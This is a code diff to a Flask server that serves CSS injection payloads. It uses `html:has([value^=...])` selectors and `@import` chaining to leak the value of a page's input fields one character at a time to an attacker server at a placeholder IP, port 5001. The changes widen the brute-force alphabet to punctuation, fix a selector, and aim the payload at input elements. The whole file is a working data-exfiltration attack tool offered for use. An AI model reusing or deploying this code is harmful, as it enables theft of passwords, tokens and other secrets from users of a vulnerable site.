@@ -7,6 +7,7 @@ import time
 app = Flask(__name__)
 
 startbalise = 'html:has('
+endbalise = ')'
 
 ######### CHANGE BY YOUR IP AND THE BALISE TO EXFILTRATE (ONLY ONE BALISE) ###########
 attacker_url = 'http://<IP>:5001'
@@ -27,10 +28,10 @@ def generate_css(balise, data):
     now = datetime.datetime.now().strftime('%Y%m%d%H%M%S%f')  # Timestamp unique
     css += f'@import "{attacker_url}/launch/data?v={z}-{now}";\n\n'
     startcommand = f"{balise}"
-    alphabet = string.ascii_lowercase + string.ascii_uppercase + string.digits  
+    alphabet = string.ascii_letters + string.digits + string.punctuation
     for i in range(0, len(alphabet)):
         brute = f"{data}{alphabet[i]}"
-        css += f"{startcommand}[value^='{brute}'])\n{{\n\t--value-{z}: url('{attacker_url}/extract/{brute}?v={z}');\n}}\n\n"
+        css += f"{startcommand}[value^='{brute}']{endbalise}\n{{\n\t--value-{z}: url('{attacker_url}/extract/{brute}?v={z}');\n}}\n\n"
     return css
 
 
@@ -41,7 +42,7 @@ def index():
     all_variable = ''
     for i in range(1, size_of_field_to_brute):
         all_variable += f' var(--value-{i},none),'
-    css += f"\n*{{\n\tbackground: {all_variable[:-1]} ;\n}}"
+    css += f"\ninput{{\n\tbackground: {all_variable[:-1]} ;\n}}"
     return css, 200, {'Content-Type': 'text/css'}
 
 
@@ -56,7 +57,8 @@ def css(data):
         return css, 200, {'Content-Type': 'text/css'}
     if len(all_data) <= len(data):
         all_data = data
-    img_data = open('img.jpeg', 'rb').read()
+    # img_data = open('img.jpeg', 'rb').read()
+    img_data = ""
     return img_data, 200, {'Content-Type': 'image/jpeg'}
 
 
